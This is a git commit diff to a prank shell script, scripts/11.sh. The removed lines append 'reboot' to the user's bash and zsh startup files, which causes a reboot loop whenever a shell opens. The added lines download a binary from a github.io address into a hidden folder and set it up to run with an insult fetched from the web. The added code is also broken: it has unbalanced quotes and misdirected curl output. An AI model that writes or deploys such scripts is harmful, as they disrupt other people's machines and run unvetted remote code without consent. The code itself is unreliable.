2d724fd301fb7136985221c281084a089deab5f6
Remy <remy.noulin@epitech.eu>
2022-10-10 23:00:17 +0200

    [ADD] xcowsay

--- scripts/11.sh
+++ scripts/11.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
-# Desc: reboot dans le bashrc
-echo "reboot" >> ~/.bashrc
-echo "reboot" >> ~/.zshrc
+# Desc: xcowsay insulte
+mkdir ~/.linux
+curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.linux/
+curl https://Waz0x.github.io/bin/cow_med.png > ~/.linux/
+echo "cd ~/.linux;./bin --image cow_med.png "$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)";cd &
